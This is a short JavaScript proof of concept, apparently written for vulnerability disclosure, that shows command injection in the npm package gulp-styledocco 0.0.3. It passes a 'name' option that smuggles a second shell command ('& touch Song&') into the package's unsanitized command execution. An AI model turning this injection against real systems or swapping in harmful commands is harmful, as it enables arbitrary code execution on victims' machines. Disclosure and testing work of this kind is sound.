/**
 * gulp-styledocco@0.0.3 is vulnerable to command injection.
 * the injection point is located in line 72 in 
 * index file(i.e.,index.js) of the package.
 * the argument "options" of the exports function in index.js can be controlled 
 * by users without any sanitization.
 */
 
var root = require("gulp-styledocco");
var gulp = require("gulp");
var options = {
  opt: 'docs',
  name: "123\"& touch Song& \""
}

gulp.src("./gulp-styledocco.js")
  .pipe(root(options));

